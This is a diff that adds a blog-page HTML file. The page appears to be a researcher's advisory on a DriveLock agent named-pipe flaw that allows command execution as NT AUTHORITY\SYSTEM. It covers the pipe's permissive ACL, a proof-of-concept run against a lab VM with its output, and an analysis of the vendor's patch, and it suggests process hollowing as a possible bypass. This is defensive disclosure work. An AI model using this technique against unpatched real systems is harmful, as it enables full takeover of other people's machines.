@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>[Advisory - DriveLock] LPE/RCE as NT-Authority\System via Named pipe - duplicate | Red vs. Blue Shell</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="[Advisory - DriveLock] LPE/RCE as NT-Authority\System via Named pipe - duplicate" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="IMPORTANT - Duplicate The reported vulnerability is a duplicate. It was already found by someone else and a patch is already available. Still I wanted to share my analysis of the vulnerability and the patch." />
+<meta property="og:description" content="IMPORTANT - Duplicate The reported vulnerability is a duplicate. It was already found by someone else and a patch is already available. Still I wanted to share my analysis of the vulnerability and the patch." />
+<link rel="canonical" href="/advisory/2025/09/26/drivelock-rce-duplicate.html" />
+<meta property="og:url" content="/advisory/2025/09/26/drivelock-rce-duplicate.html" />
+<meta property="og:site_name" content="Red vs. Blue Shell" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-09-26T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="[Advisory - DriveLock] LPE/RCE as NT-Authority\System via Named pipe - duplicate" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-09-26T00:00:00+00:00","datePublished":"2025-09-26T00:00:00+00:00","description":"IMPORTANT - Duplicate The reported vulnerability is a duplicate. It was already found by someone else and a patch is already available. Still I wanted to share my analysis of the vulnerability and the patch.","headline":"[Advisory - DriveLock] LPE/RCE as NT-Authority\\System via Named pipe - duplicate","mainEntityOfPage":{"@type":"WebPage","@id":"/advisory/2025/09/26/drivelock-rce-duplicate.html"},"url":"/advisory/2025/09/26/drivelock-rce-duplicate.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link id="main-stylesheet" rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="Red vs. Blue Shell" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Red vs. Blue Shell</a>
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon"></span>
+        </label>
+
+        <div class="nav-items">
+  <a class="nav-item" href="/about/">About</a>
+</div>
+
+      </nav>
+  </div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">[Advisory - DriveLock] LPE/RCE as NT-Authority\System via Named pipe - duplicate</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2025-09-26T00:00:00+00:00" itemprop="datePublished">Sep 26, 2025
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody"><p class="advisory-details">
+
+<table>
+    <tr>
+        <th>Product:</th>
+        <th>DriveLock</th>
+    </tr>
+    <tr>
+        <th>Homepage:</th>
+        <th><a href="https://www.drivelock.com/">https://www.drivelock.com/</a></th>
+    </tr>
+
+
+    <tr>
+        <th>CVE Number:</th>
+        <th><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-55187">CVE-2025-55187</a></th>
+    </tr>
+
+
+    
+    <tr>
+        <th>Vulnerable version:</th>
+        <th>25.1.2.57576</th>
+    </tr>
+    <tr>
+        <th>Fixed version:</th>
+        <th>25.1.4.58328 - 25.1 Patch 2, 24.2.6.58383 - 24.2 Patch 4, 24.1.5.58384 - 24.1 Patch 3</th>
+    </tr>
+    <tr>
+        <th>CVSS Score:</th>
+        <th><span class="CRITICAL">CRITICAL 9.9</span> - <a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H</a>
+        </th>
+    </tr>
+    <tr>
+        <th>Found:</th><th>Sep 10, 2025</th>
+    </tr>
+</table>
+
+</p><h1 id="important---duplicate">IMPORTANT - Duplicate</h1>
+<p>The reported vulnerability is a duplicate. It was already found by someone else and a patch is already available. Still I wanted to share my analysis of the vulnerability and the patch.</p>
+
+<h1 id="product-description">Product description</h1>
+<blockquote>
+  <p>The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside.
+This means you are secure at the centre, with all paths of access to your sensitive data blocked.</p>
+</blockquote>
+
+<p><em>Cite: <a href="https://www.drivelock.com/en/">DriveLock - Homepage</a></em></p>
+
+<p>This platform includes the <code class="language-plaintext highlighter-rouge">DriveLock Core</code> component, which is an agent installed on the client machines.</p>
+
+<h2 id="tested-software-version">Tested software version</h2>
+<pre><code class="language-ps1">PS C:\Users\win.pentest&gt; Get-FileHash "C:\Program Files\CenterTools\DriveLock\DriveLock.exe"
+
+Algorithm       Hash                                                                   Path
+---------       ----                                                                   ----
+SHA256          3ED7B4BA35E4784EED44F3A20394EF24FE9BB73CEF0B46D1D732EFD50C82F19B       C:\Program Files\CenterTools\DriveLock\DriveLock.exe
+
+PS C:\&gt; Get-ItemProperty "C:\Program Files\CenterTools\DriveLock\DriveLock.exe" |fl -Property versioninfo
+
+VersionInfo : File:             C:\Program Files\CenterTools\DriveLock\DriveLock.exe
+              InternalName:     DriveLock.exe
+              OriginalFilename: DriveLock.exe
+              FileVersion:      25.1.2.57576
+              FileDescription:  Agent service
+              Product:          DriveLock
+              ProductVersion:   25.1.2.57576
+              Debug:            False
+              Patched:          False
+              PreRelease:       False
+              PrivateBuild:     False
+              SpecialBuild:     False
+              Language:         English (United States)
+</code></pre>
+
+<h1 id="vulnerability-overview">Vulnerability overview</h1>
+
+<p>During the installation of the product a Window service named <code class="language-plaintext highlighter-rouge">DriveLock</code> is installed.</p>
+
+<pre><code class="language-ps1">PS C:\Users\win.pentest&gt; Get-CimInstance -ClassName win32_service | ?{$_.Name -match '^drivelock'} |select *
+
+
+Name                    : DriveLock
+Status                  : OK
+ExitCode                : 0
+DesktopInteract         : False
+ErrorControl            : Normal
+PathName                : "C:\Program Files\CenterTools\DriveLock\DriveLock.exe"
+ServiceType             : Own Process
+StartMode               : Auto
+Caption                 : DriveLock
+Description             : Locks removable drives based on company policy.
+InstallDate             :
+CreationClassName       : Win32_Service
+Started                 : True
+SystemCreationClassName : Win32_ComputerSystem
+SystemName              : DESKTOP-LSJFSMS
+AcceptPause             : False
+AcceptStop              : True
+DisplayName             : DriveLock
+ServiceSpecificExitCode : 0
+StartName               : LocalSystem
+State                   : Running
+TagId                   : 0
+CheckPoint              : 0
+DelayedAutoStart        : False
+ProcessId               : 1708
+WaitHint                : 0
+PSComputerName          :
+</code></pre>
+<p>This services exposes the <a href="https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipes">named pipe</a> <code class="language-plaintext highlighter-rouge">\Device\NamedPipe\drivelock</code>.
+<img src="/assets/drivelock/drivelock-pipe.PNG" alt="Named pipe - drivelock" />
+<em>Named pipe - drivelock</em></p>
+
+<p>As shown above the group <code class="language-plaintext highlighter-rouge">everyone</code> has the access level <code class="language-plaintext highlighter-rouge">Full control</code> on this object. This allows an authenticated attacker and even <code class="language-plaintext highlighter-rouge">anonymous</code> to open the pipe.</p>
+
+<p>The service, exposing the named pipe, implements a simple <code class="language-plaintext highlighter-rouge">remote procedure call - RPC</code> interface by reading a command struct from the connected clients.</p>
+
+<p>The handler for the commands is located at the <code class="language-plaintext highlighter-rouge">Relative virtual address (RVA)</code> - <code class="language-plaintext highlighter-rouge">0x2b0a80</code> in the <code class="language-plaintext highlighter-rouge">drivelock.exe</code> binary.
+One of these supported commands is <code class="language-plaintext highlighter-rouge">PM_COMMAND</code>, which is a simple wrapper of <code class="language-plaintext highlighter-rouge">CreateProcessW</code>.</p>
+
+<p><img src="/assets/drivelock/onMsg-exec.PNG" alt="Command handler - PM_COMMAND" />
+<em>Command handler - PM_COMMAND</em></p>
+
+<p>The argument <code class="language-plaintext highlighter-rouge">lpCommandLine</code> of the <code class="language-plaintext highlighter-rouge">CreateProcessW</code> call is taken from the command struct sent by the connected client, which allows full control of the executed binary and its arguments.</p>
+
+<p><strong>Summary</strong>:</p>
+
+<p>An attacker which can open a connection to the named pipe <code class="language-plaintext highlighter-rouge">drivelock</code>, can execute a arbitrary command, controlling the full command line, in the context of the user <code class="language-plaintext highlighter-rouge">NT authority\System</code>.
+This can be done locally to escalate privileges - <code class="language-plaintext highlighter-rouge">LPE</code> - to <code class="language-plaintext highlighter-rouge">NT authority\System</code> from a normal user or the <code class="language-plaintext highlighter-rouge">named pipe</code> can be opend on a remote machine which allows <code class="language-plaintext highlighter-rouge">remote code execution - RCE</code> as <code class="language-plaintext highlighter-rouge">NT authority\System</code>.</p>
+
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p>To exploit this a connection to the named pipe <code class="language-plaintext highlighter-rouge">drivelock</code> has to be opend and a <code class="language-plaintext highlighter-rouge">PM_COMMAND</code> message should be sent.
+The following snippets show running the included <a href="/assets/drivelock/poc/dl-pipe-exec.cpp">PoC - dl-pipe-exe</a> on the local machine against a VM - <code class="language-plaintext highlighter-rouge">DESKTOP-LSJFSMS - 192.168.56.103</code> with an installed <code class="language-plaintext highlighter-rouge">DriveLock</code> agent.</p>
+
+<p>It executes the command <code class="language-plaintext highlighter-rouge">whoami &gt; C:\rce-poc.txt</code> to get the user details of the user who created the process.</p>
+
+<pre><code class="language-ps1">PS &gt; .\Debug\dl-pipe-exec.exe 192.168.56.103 cmd /C '\"whoami /all &gt;C:\rce-poc.txt\"'
+Using host: 192.168.56.103
+------&lt; PIPE exploit &gt;----
+Opening pipe: \\192.168.56.103\pipe\drivelock
+Using cmdline: -- cmd /C "whoami /all &gt;C:\rce-poc.txt" --
+Result: 1000 -- 9007628751470592
+</code></pre>
+<p><em>Running PoC on local system</em></p>
+
+<p><img src="/assets/drivelock/procmon-exec.PNG" alt="Procmon details about processes" />
+<em>Procmon details about processes</em></p>
+
+<pre><code class="language-ps1">PS C:\Users\win.pentest&gt; type C:\rce-poc.txt
+
+USER INFORMATION
+----------------
+
+User Name           SID
+=================== ========
+nt authority\system S-1-5-18
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes
+====================================== ================ ============ ==================================================
+BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+Mandatory Label\System Mandatory Level Label            S-1-16-16384
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== ========
+SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
+SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
+</code></pre>
+<p><em>Output of the executed whoami command</em></p>
+
+<h1 id="solution">Solution</h1>
+<p>Patch for version <code class="language-plaintext highlighter-rouge">25.1</code>, <code class="language-plaintext highlighter-rouge">24.2</code> and <code class="language-plaintext highlighter-rouge">24.1</code> were published on <strong>2025-07-30</strong>, which fixes the vulnerability.</p>
+
+<p>Patched versions:</p>
+<ul>
+  <li>25.1.4.58328 - 25.1 Patch 2</li>
+  <li>24.2.6.58383 - 24.2 Patch 4</li>
+  <li>24.1.5.58384 - 24.1 Patch 3</li>
+</ul>
+
+<p>No other mitigations are known.</p>
+
+<h2 id="patch-analysis">Patch analysis</h2>
+<p>To fix the above shown vulnerability they implemented a few security check and settings.</p>
+
+<p>1) First of all the call to <code class="language-plaintext highlighter-rouge">CreateNamedPipeW</code> includes the <code class="language-plaintext highlighter-rouge">dwOpenMode</code> flag <code class="language-plaintext highlighter-rouge">PIPE_REJECT_REMOTE_CLIENTS</code>. This removes the <code class="language-plaintext highlighter-rouge">RCE</code> from the vulnerability, because opening the <code class="language-plaintext highlighter-rouge">NamedPipe</code> over the network results in a ErrorCode <code class="language-plaintext highlighter-rouge">0x5 - Access denied</code>.</p>
+
+<p>2) The second mitigation includes a check if the binary is running as a server, which is true in the service component. If this is true, it disables a few commands implemented in <code class="language-plaintext highlighter-rouge">on_pipeMessage</code> handler, like the exploited <code class="language-plaintext highlighter-rouge">PM_COMMAND</code> operation.</p>
+
+<p><img src="/assets/drivelock/onMsg-fixed.png" alt="onMessage - fixed" />
+<em>onMessage - fixed</em></p>
+
+<p>3) The third mitigation checks the path of the client process, which connted to the pipe and ensures that it is placed in the installation directory of <code class="language-plaintext highlighter-rouge">DirveLock</code>. For example if a client process binary is <code class="language-plaintext highlighter-rouge">C:\temp\exploit.exe</code> the message handling is aborted with an error message <code class="language-plaintext highlighter-rouge">Forbidden caller</code>.</p>
+
+<p><img src="/assets/drivelock/onMsg-forbidden-caller.png" alt="onMessage - forbidden caller" />
+<em>onMessage - forbidden caller</em></p>
+
+<p>This is is only active if the <code class="language-plaintext highlighter-rouge">isServer</code> flag is true. But imho this is not working as intended. Using <code class="language-plaintext highlighter-rouge">process hollowing</code> an attacker should be able to spoof the binary path of the process and bypasses the check. I did not verify this.</p>
+
+<h1 id="timeline">Timeline</h1>
+<ul>
+  <li>2025-09-13: Initial contact via <code class="language-plaintext highlighter-rouge">security@drivelock.com</code></li>
+  <li>2025-09-16: No answer, try to contact <code class="language-plaintext highlighter-rouge">info@drivelock.com</code></li>
+  <li>2025-09-18: No answer, try to contact <code class="language-plaintext highlighter-rouge">security@drivelock.com</code> again</li>
+  <li>2025-09-19: No answer, try to contact via <a href="https://www.drivelock.com/en/contact">DriveLock - Contact</a>, got marketing E-Mail a few minutes later but no answer</li>
+  <li>2025-09-19: Posted tweet on <code class="language-plaintext highlighter-rouge">X</code> referencing <code class="language-plaintext highlighter-rouge">@drivelock_de</code> for contact</li>
+  <li>2025-09-22: Posted message on <code class="language-plaintext highlighter-rouge">LinkedIn</code>, referencing <code class="language-plaintext highlighter-rouge">drivelockse</code></li>
+  <li>2025-09-23: Received S/MIME Certificate from <code class="language-plaintext highlighter-rouge">Mark.Hartmann@drivelock.com</code></li>
+  <li>2025-09-23: Sent report to DriveLock</li>
+  <li>2025-09-24: Received answer, that the found vulnerability is a duplicate and a patch is already available</li>
+</ul>
+
+  </div>
+
+  <a class="u-url" href="/advisory/2025/09/26/drivelock-rce-duplicate.html" hidden></a>
+</article>
+
+      </div>
+    </main><link id="fa-stylesheet" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.0.0/css/all.min.css">
+
+<footer class="site-footer h-card">
+  <data class="u-url" value="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+      </div>
+      <div class="footer-col">
+        <p>Posts about IT Security, pentesting and bug bounty hunting.</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+    <a rel="me" href="" target="_blank" title="">
+      <span class="grey fa-brands fa- fa-lg"></span>
+    </a>
+  </li><li>
+    <a rel="me" href="" target="_blank" title="">
+      <span class="grey fa-brands fa- fa-lg"></span>
+    </a>
+  </li>
+  <li>
+    <a href="/feed.xml" target="_blank" title="Subscribe to syndication feed">
+      <svg class="svg-icon grey" viewbox="0 0 16 16">
+        <path d="M12.8 16C12.8 8.978 7.022 3.2 0 3.2V0c8.777 0 16 7.223 16 16h-3.2zM2.194
+          11.61c1.21 0 2.195.985 2.195 2.196 0 1.21-.99 2.194-2.2 2.194C.98 16 0 15.017 0
+          13.806c0-1.21.983-2.195 2.194-2.195zM10.606
+          16h-3.11c0-4.113-3.383-7.497-7.496-7.497v-3.11c5.818 0 10.606 4.79 10.606 10.607z"
+        />
+      </svg>
+    </a>
+  </li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+
+</body>
+
+</html>
